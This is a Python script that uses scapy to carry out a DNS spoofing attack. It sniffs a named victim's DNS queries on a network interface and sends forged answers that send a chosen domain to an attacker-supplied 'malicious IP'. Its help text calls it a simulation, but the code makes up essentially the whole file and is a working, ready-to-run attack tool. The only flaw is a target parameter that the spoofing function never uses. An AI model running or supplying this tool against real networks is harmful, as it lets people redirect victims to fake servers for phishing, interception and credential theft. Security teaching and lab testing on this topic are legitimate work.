import argparse
from scapy.all import *


def dns_spoof(packet, target_ip, spoofed_ip, domain):
    # Check if the packet is a DNS request (UDP and DNS layers)
    if packet.haslayer(DNS) and packet.haslayer(UDP):
        # Check if the packet is a DNS query (opcode 0) and for the specific domain
        if packet[DNS].qr == 0 and domain in str(packet[DNS].qd.qname):
            print(f"[DNS Spoof] Intercepted request for {domain}")

            # Create a fake DNS response
            spoofed_response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                               UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                               DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                                   an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=spoofed_ip))

            # Send the spoofed DNS response back to the victim
            send(spoofed_response, verbose=False)
            print(f"Sent spoofed DNS response: {domain} -> {spoofed_ip}")


def main():
    parser = argparse.ArgumentParser(description="DNS Spoofing Attack Simulation")
    parser.add_argument("-i", "--interface", type=str, help="Network interface to listen on", required=True)
    parser.add_argument("-t", "--target", type=str, help="Target IP address of the victim", required=True)
    parser.add_argument("-s", "--spoofed_ip", type=str, help="Malicious IP to respond with", required=True)
    parser.add_argument("-d", "--domain", type=str, help="Domain to spoof (e.g., example.com)", required=True)

    args = parser.parse_args()

    print(f"[*] Listening on {args.interface} for DNS requests targeting {args.domain}")

    # Capture DNS traffic and apply spoofing
    sniff(iface=args.interface, filter=f"udp port 53 and ip src {args.target}",
          prn=lambda packet: dns_spoof(packet, args.target, args.spoofed_ip, args.domain))


if __name__ == "__main__":
    main()
